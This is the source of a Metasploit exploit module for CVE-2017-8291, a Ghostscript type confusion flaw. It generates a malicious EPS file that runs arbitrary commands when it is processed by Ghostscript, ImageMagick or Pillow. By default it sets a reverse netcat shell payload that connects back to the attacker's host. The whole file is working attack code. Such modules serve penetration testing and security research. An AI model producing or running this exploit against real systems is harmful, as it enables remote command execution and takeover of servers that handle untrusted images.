# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit

  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Ghostscript Type Confusion Arbitrary Command Execution&#039;,
      &#039;Description&#039;     => %q{
        This module exploits a type confusion vulnerability in Ghostscript that can
        be exploited to obtain arbitrary command execution. This vulnerability affects
        Ghostscript version 9.21 and earlier and can be exploited through libraries
        such as ImageMagick and Pillow.
      },
      &#039;Author&#039;          => [
        &#039;Atlassian Security Team&#039;, # Vulnerability discovery
        &#039;hdm&#039;                      # Metasploit module
      ],
      &#039;References&#039;      => [
        %w{CVE 2017-8291},
        %w{URL https://bugs.ghostscript.com/show_bug.cgi?id=697808},
        %w{URL http://seclists.org/oss-sec/2017/q2/148},
        %w{URL https://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=04b37bbce174eed24edec7ad5b920eb93db4d47d},
        %w{URL https://git.ghostscript.com/?p=ghostpdl.git;a=commit;h=4f83478c88c2e05d6e8d79ca4557eb039354d2f3}
      ],
      &#039;DisclosureDate&#039;  => &#039;Apr 27 2017&#039;,
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Platform&#039;        => &#039;unix&#039;,
      &#039;Arch&#039;            => ARCH_CMD,
      &#039;Privileged&#039;      => false,
      &#039;Payload&#039;         => {
        &#039;BadChars&#039;      => "\x22\x27\x5c)(", # ", &#039;, \, (, and )
        &#039;Compat&#039;        => {
          &#039;PayloadType&#039; => &#039;cmd cmd_bash&#039;,
          &#039;RequiredCmd&#039; => &#039;generic netcat bash-tcp&#039;
        }
      },
      &#039;Targets&#039;         => [
        [&#039;EPS file&#039;,  template: &#039;msf.eps&#039;]
      ],
      &#039;DefaultTarget&#039;   => 0,
      &#039;DefaultOptions&#039;  => {
        &#039;PAYLOAD&#039;               => &#039;cmd/unix/reverse_netcat&#039;,
        &#039;LHOST&#039;                 => Rex::Socket.source_address,
        &#039;DisablePayloadHandler&#039; => false,
        &#039;WfsDelay&#039;              => 9001
      }
    ))

    register_options([
      OptString.new(&#039;FILENAME&#039;, [true, &#039;Output file&#039;, &#039;msf.eps&#039;])
    ])
  end

  # Example usage from the bug tracker:
  # $ gs -q -dNOPAUSE -dSAFER -sDEVICE=ppmraw -sOutputFile=/dev/null -f exploit2.eps

  def exploit
    file_create(template.sub(&#039;echo vulnerable > /dev/tty&#039;, payload.encoded))
  end

  def template
    ::File.read(File.join(
      Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2017-8291&#039;,
      target[:template]
    ))
  end

end

